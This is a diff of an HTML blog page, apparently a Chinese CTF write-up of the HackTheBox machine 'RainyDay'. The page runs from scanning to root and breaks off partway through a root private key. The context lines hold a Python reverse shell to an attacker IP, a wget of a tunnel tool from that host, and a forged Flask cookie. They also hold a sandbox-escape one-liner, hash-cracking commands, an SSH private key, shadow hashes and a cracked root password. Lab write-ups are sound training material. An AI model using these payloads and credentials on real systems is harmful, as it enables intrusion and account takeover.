@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;502  10.10.11.184   端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.184Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-10-18 13:01">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;502  10.10.11.184                                                                                                              端口扫描22和80: 12345678">
 <meta property="og:type" content="article">
 <meta property="og:title" content="RainyDay - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/10/18/RainyDay-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;502  10.10.11.184   端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.184Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-10-18 13:01">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;502  10.10.11.184                                                                                                              端口扫描22和80: 12345678">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022101801.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022101802.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022101803.jpg">
@@ -136,7 +136,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -226,7 +226,14 @@
 </li>
 <li><h2 id="10-10-11-184"><a href="#10-10-11-184" class="headerlink" title="10.10.11.184"></a>10.10.11.184</h2></li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101801.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101801.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.184</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-18 13:01 CST</span><br><span class="line">Nmap scan report for 10.10.11.184</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 48dde361dc5d5878f881dd6172fe6581 (ECDSA)</span><br><span class="line">|_  256 adbf0bc8520f49a9a0ac682a2525cd6d (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://rainycloud.htb</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 77.90 seconds</span><br></pre></td></tr></table></figure>
 
@@ -235,9 +242,23 @@
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>需要加hosts,一个hosting service：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.184 rainycloud.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101802.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101802.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>注册功能不可用，登录错误时源码中提示信息，知道路径和后端使用python：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101803.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101803.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>子域名可以发现一个dev,响应403：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://rainycloud.htb/" -H 'Host: FUZZ.rainycloud.htb' -fs 229</span><br><span class="line"></span><br><span class="line">dev                     [Status: 403, Size: 26, Words: 5, Lines: 1, Duration: 264ms]</span><br></pre></td></tr></table></figure>
 
@@ -253,8 +274,22 @@
 <h1 id="Containers"><a href="#Containers" class="headerlink" title="Containers"></a>Containers</h1><p>得到的账号密码登录，创建一个容器，容器中运行任意命令，得到容器shell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101804.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101805.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101804.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101805.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h2><p>前面的结果发现有dev子域名，外部访问是403，考虑打通隧道后访问：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line">./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reverse</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 容器内</span></span><br><span class="line">wget http://10.10.14.15:7777/chisel_1.7.6_linux_amd64</span><br><span class="line">chmod +x chisel_1.7.6_linux_amd64</span><br><span class="line">./chisel_1.7.6_linux_amd64 client --max-retry-count=1 10.10.14.15:9999 R:8888:172.18.0.1:80</span><br></pre></td></tr></table></figure>
 
@@ -262,18 +297,60 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1     dev.rainycloud.htb</span><br></pre></td></tr></table></figure>
 
 <p>然后可以访问到dev：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101806.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101806.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="dev-rainycloud-htb"><a href="#dev-rainycloud-htb" class="headerlink" title="dev.rainycloud.htb"></a>dev.rainycloud.htb</h1><p>dev也有一些api，其中有一个healthcheck：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101807.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101808.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101807.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101808.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="healthcheck"><a href="#healthcheck" class="headerlink" title="healthcheck"></a>healthcheck</h2><p>这个接口支持post请求，需要的参数根据前面得到的响应构造：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101809.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101810.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101809.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101810.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>很明显是提供正则匹配对应文件内容，结果为true和false，那就可以fuzz出任意文件内容了</p>
 <h2 id="SECRET-KEY"><a href="#SECRET-KEY" class="headerlink" title="SECRET_KEY"></a>SECRET_KEY</h2><p>根据前面的信息可以知道是python，所以fuzz SECRET_KEY：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;&#x2F;var&#x2F;www&#x2F;rainycloud&#x2F;FUZZ.py&amp;type&#x3D;custom&amp;pattern&#x3D;^SECRET_KEY.*&#39;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101811.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101811.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>fuzz出内容：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67</span><br></pre></td></tr></table></figure>
 
@@ -285,28 +362,77 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie "&#123;'username': 'jack'&#125;" --secret 'f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67'</span><br><span class="line"></span><br><span class="line">eyJ1c2VybmFtZSI6ImphY2sifQ.Y05Gog.GRPXrP7KBA6mP1OiM9H9cWyiWFk</span><br></pre></td></tr></table></figure>
 
 <p>替换cookie，可以看到jack用户的secrets容器：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101812.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101812.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>同样的方法拿到这个容器shell,查看进程发现一个sleep，这个进程有一个挂载，得到jack的私钥：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101813.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101813.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="jack-id-rsa"><a href="#jack-id-rsa" class="headerlink" title="jack_id_rsa"></a>jack_id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEA7Ce&#x2F;LAvrYP84rAa7QU51Y+HxWRC5qmmVX4wwiCuQlDqz73uvRkXq</span><br><span class="line">qdDbDtTCnJUVwNJIFr4wIMrXAOvEp0PTaUY5xyk3KW4x9S1Gqu8sV1rft3Fb7rY1RxzUow</span><br><span class="line">SjS+Ew+ws4cpAdl&#x2F;BvrCrw9WFwEq7QcskUCON145N06NJqPgqJ7Z15Z63NMbKWRhvIoPRO</span><br><span class="line">JDhAaulvxjKdJr7AqKAnt+pIJYDkDeAfYuPYghJN&#x2F;neeRPan3ue3iExiLdk7OA&#x2F;8PkEVF0</span><br><span class="line">&#x2F;pLldRcUB09RUIoMPm8CR7ES&#x2F;58p9MMHIHYWztcMtjz7mAfTcbwczq5YX3eNbHo9YFpo95</span><br><span class="line">MqTueSxiSKsOQjPIpWPJ9LVHFyCEOW5ONR&#x2F;NeWjxCEsaIz2NzFtPq5tcaLZbdhKnyaHE6k</span><br><span class="line">m2eS8i8uVlMbY&#x2F;XnUpRR1PKvWZwiqlzb4F89AkqnFooztdubdFbozV0vM7UhqKxtmMAtnu</span><br><span class="line">a20uKD7bZV8W&#x2F;rWvl5UpZ2A+0UEGicsAecT4kUghAAAFiHftftN37X7TAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAOwnvywL62D&#x2F;OKwGu0FOdWPh8VkQuapplV+MMIgrkJQ6s+97r0ZF6qnQ2w7UwpyV</span><br><span class="line">FcDSSBa+MCDK1wDrxKdD02lGOccpNyluMfUtRqrvLFda37dxW+62NUcc1KMEo0vhMPsLOH</span><br><span class="line">KQHZfwb6wq8PVhcBKu0HLJFAjjdeOTdOjSaj4Kie2deWetzTGylkYbyKD0TiQ4QGrpb8Yy</span><br><span class="line">nSa+wKigJ7fqSCWA5A3gH2Lj2IISTf53nkT2p97nt4hMYi3ZOzgP&#x2F;D5BFRdP6S5XUXFAdP</span><br><span class="line">UVCKDD5vAkexEv+fKfTDByB2Fs7XDLY8+5gH03G8HM6uWF93jWx6PWBaaPeTKk7nksYkir</span><br><span class="line">DkIzyKVjyfS1RxcghDluTjUfzXlo8QhLGiM9jcxbT6ubXGi2W3YSp8mhxOpJtnkvIvLlZT</span><br><span class="line">G2P151KUUdTyr1mcIqpc2+BfPQJKpxaKM7Xbm3RW6M1dLzO1IaisbZjALZ7mttLig+22Vf</span><br><span class="line">Fv61r5eVKWdgPtFBBonLAHnE+JFIIQAAAAMBAAEAAAGAB0Sd5JwlTWHte5Xlc3gXstBEXk</span><br><span class="line">pefHktaLhm0foNRBKecRNsbIxAUaOk6krwBmOsPLf8Ef8eehPkFBotfjxfKFFJ+&#x2F;Avy22h</span><br><span class="line">yfrvvtkHk1Svp&#x2F;SsMKeY8ixX+wBsiixPFprczOHUl1WGClVz&#x2F;wlVqq2Iqs+3dyKRAUULhx</span><br><span class="line">LaxDgM0KxVDTTTKOFnMJcwUIvUT9cPXHr8vqvWHFgok8gCEO379HOIEUlBjgiXJEGt9tP1</span><br><span class="line">oge5WOnmwyIer2yNHweW26xyaSgZjZWP6z9Il1Gab0ZXRu1sZYadcEXZcOQT6frZhlF&#x2F;Dx</span><br><span class="line">pmgbdtejlRcUaI86mrwPFAP1PClLMlilroEaHCl8Dln5HEqnkpoNaJyg8di1pud+rJwlQw</span><br><span class="line">ZyL6xnJ0Ke4ul3fDWpYnO&#x2F;t8q5DQgnIhRKwyDGSM7M6DqBXi8CHSbPITzOMaiWgNzue49D</span><br><span class="line">7ejAWa2sSlHJYhS0Uxpa7xQ3LslsnnysxIsZHKwmaMerKMGRmpoV2h5&#x2F;VnXVeiEMIxAAAA</span><br><span class="line">wQCoxMsk1JPEelb6bcWIBcJ0AuU5f16fjlYZMRLP75x&#x2F;el1&#x2F;KYo3J9gk+9BMw9AcZasX7Q</span><br><span class="line">LOsbVdL45y14IIe6hROnj&#x2F;3b8QPsmyEwGc13MYC0jgKN7ggUxkp4BPH4EPbPfouRkj7WWL</span><br><span class="line">UwVjOxsPTXt2taMn5blhEF2+YwH5hyrVS2kW4CPYHeVMa1+RZl5&#x2F;xObp&#x2F;A62X&#x2F;CWHY9CMI</span><br><span class="line">nY9sRDI415LvIgofRqEdYgCdC6UaE&#x2F;MSuDiuI0QcsyGucQlMQAAADBAPFAnhZPosUFnmb9</span><br><span class="line">Plv7lbz9bAkvdcCHC46RIrJzJxWo5EqizlEREcw&#x2F;qerre36UFYRIS7708Q9FELDV9dkodP</span><br><span class="line">3xAPNuM9OCrD0MLBiReWq9WDEcmRPdc2nWM5RRDqcBPJy5+gsDTVANerpOznu7I9t5Jt+6</span><br><span class="line">9Stx6TypwWshB+4pqECgiUfR8H1UNwSClU8QLVmDmXJmYScD&#x2F;jTU4z3yHRaVzGinxOwDVG</span><br><span class="line">PITC9yJXJgWTSFQC8UUjrqI7cRoFtI9QAAAMEA+pddCQ8pYvVdI36BiDG41rsdM0ZWCxsJ</span><br><span class="line">sXDQ7yS5MmlZmIMH5s1J&#x2F;wgL90V9y7keubaJxw1aEgXBa6HBuz8lMiAx7DgEMospHBO00p</span><br><span class="line">92XFjtlFMwCX6V+RW+aO0D+mxmhgP3q3UDcVjW&#x2F;Xar7CW57beLRFoyAyUS0YZNP7USkBZg</span><br><span class="line">FXc7fxSlEqYqctfe4fZKBxV68i&#x2F;c+LDvg8MwoA5HJZxWl7a9zWux7JXcrloll6+Sbsro7S</span><br><span class="line">bU2hJSEWRZDLb9AAAADWphY2tAcmFpbnlkYXkBAgMEBQ&#x3D;&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>jack ssh 私钥登录：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101814.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101814.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="jack-adm"><a href="#jack-adm" class="headerlink" title="jack_adm"></a>jack_adm</h1><p>jack可以以jack_adm身份运行指定程序,看名字就知道是python沙盒逃逸类型：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101815.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101815.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h2><ul>
 <li>The Craziest Python Sandbox Escape | Reelix’s Site of Stuff<br><a href="https://www.reelix.za.net/2021/04/the-craziest-python-sandbox-escape.html" target="_blank" rel="noopener">https://www.reelix.za.net/2021/04/the-craziest-python-sandbox-escape.html</a></li>
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[1].__subclasses__()[144] -&gt; warnings.catch_warnings</span><br><span class="line"></span><br><span class="line">echo 'print(().__class__.__mro__[1].__subclasses__()[144].__init__.__globals__["__builtins__"]["__loader__"]().load_module("builtins").__import__("os").system("whoami"))' &gt; /tmp/test &amp;&amp; sudo -u jack_adm /usr/bin/safe_python /tmp/test</span><br><span class="line"></span><br><span class="line">echo 'print(().__class__.__mro__[1].__subclasses__()[144].__init__.__globals__["__builtins__"]["__loader__"]().load_module("builtins").__import__("os").system("bash -i"))' &gt; /tmp/test &amp;&amp; sudo -u jack_adm /usr/bin/safe_python /tmp/test</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101816.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101816.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>只有一个看起来是指定密码加salt后生成hash的程序，密码为空得到的hash破解出来salt,使用salt生成新字典破解前面在api/user那里得到的root hash：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101817.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101817.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/md5decryptor-uk.txt</span><br><span class="line"></span><br><span class="line">Sup3rDup3r</span><br><span class="line"></span><br><span class="line">sed 's/$/Sup3rDup3r/' /usr/share/wordlists/rockyou.txt &gt; newrockyou.txt</span><br><span class="line"></span><br><span class="line">sudo john --wordlist=newrockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line">246813579Sup3rDup3r</span><br></pre></td></tr></table></figure>
 
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>破解出来的密码切到root：</p>
 <p>(这个box太CTF了)</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101818.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022101818.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$5SIveCET7DEtfdvKf0xbB1$XK4FfV4Ud4KKP3tJGSpYrYQDFofln6ZOP3jbd2O1mL6:19256:0:99999:7:::</span><br><span class="line">jack:$y$j9T$ldTcnggvK0yHbGNv0.aKi0$vpHrVNFy1sfJecOtDaaQiKK8Da2AFG7fYUyJwDC5Gg0:19131:0:99999:7:::</span><br><span class="line">jack_adm:$y$j9T$6eiMKhY4J8eSrAtVSP44K0$U6UClG5Inrs5fAtJQy3gjZJ99YGd.7VocPcWs.78C25:19147:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 <h2 id="root-id-rsa"><a href="#root-id-rsa" class="headerlink" title="root_id_rsa"></a>root_id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAvmri&#x2F;DfrS3yLNn5Zy+&#x2F;kRfeYsZXQY9WCU6y6&#x2F;VdBRcBu&#x2F;ibWNYlk</span><br><span class="line">y41YpFDQYgVDwLaJVK8DkpiuUBsqBjw5brra5KLMKv&#x2F;ZU6oF17gj6q38WWzFMR8OxR3J6G</span><br><span class="line">y37eBliXvnrPZLHJA5JZ1bKzCiG0ZBwV6YC9MhY4RYV831LjVwz+Fs5viMQzVpL01&#x2F;crI8</span><br><span class="line">wSVOxuLXPfbR4Zvxc+uuxeAy8EIg2qGfyyADnNYT50LzpxJVZcjBYUofyljEDkvoEQZiLA</span><br><span class="line">JD2kP9FOKbkGR+4XEmT952tf06ct&#x2F;0pOLCX87NluOuu9z2vtgzFUDXSHyA&#x2F;fOPluHwaJTT</span><br><span class="line">XD17uC5jU8TY0y1z8HiqimPWcGm5zRXipUmKIOG6fVMTdl9QoR1rv5ObfBYMl3yMC6TE1T</span><br><span class="line">QVaizKNNy+9dFHhTZPr2D2gGoJFQCkjibgQ1wIYkr&#x2F;lp0tLor48ZiJ6wHMc9RneO2CLsoB</span><br><span class="line">79jh8V50pvGEsLOamMhKC03UrsrFfmjam6LL92OVAAAFiJuCzs+bgs7PAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAL5q4vw360t8izZ+Wcvv5EX3mLGV0GPVglOsuv1XQUXAbv4m1jWJZMuNWKRQ0GIF</span><br><span class="line">Q8C2iVSvA5KYrlAbKgY8OW662uSizCr&#x2F;2VOqBde4I+qt&#x2F;FlsxTEfDsUdyehst+3gZYl756</span><br><span class="line">z2SxyQOSWdWyswohtGQcFemAvTIWOEWFfN9S41cM&#x2F;hbOb4jEM1aS9Nf3KyPMElTsbi1z32</span><br><span class="line">0eGb8XPrrsXgMvBCINqhn8sgA5zWE+dC86cSVWXIwWFKH8pYxA5L6BEGYiwCQ9pD&#x2F;RTim5</span><br><span class="line">BkfuFxJk&#x2F;edrX9OnLf9KTiwl&#x2F;OzZbjrrvc9r7YMxVA10h8gP3zj5bh8GiU01w9e7guY1PE</span><br><span class="line">2NMtc&#x2F;B4qopj1nBpuc0V4qVJiiDhun1TE3ZfUKEda7+Tm3wWDJd8jAukxNU0FWosyjTcvv</span><br><span class="line">XRR4U2T69g9oBqCRUApI4m4ENcCGJK&#x2F;5adLS6K+PGYiesBzHPUZ3jtgi7KAe&#x2F;Y4fFedKbx</span><br><span class="line">hLCzmpjISgtN1K7KxX5o2puiy&#x2F;djlQAAAAMBAAEAAAGAC7RtTHyxeXvn4MsmgOs3mHduSu</span><br><span class="line">g&#x2F;HYvnzXXuLpl4+S0phXTksPjHmd2P59XR4VyafBOcYHi7mvzIpkLtM+Hq09wnjWtWaoQ8</span><br><span class="line">mzB12HtItenI+8Q8YNccZNB+c0uPiM9E3o0fwhmHp3NUF&#x2F;RSwNZl+JA6hYTnir6JLGFbvt</span><br><span class="line">X5rsP5McYVGCOKF62GUDKO1YGQS30cGQyjl3r&#x2F;DsOztWD05tPvvaYK9&#x2F;V8aZOHtVHRemM6</span><br><span 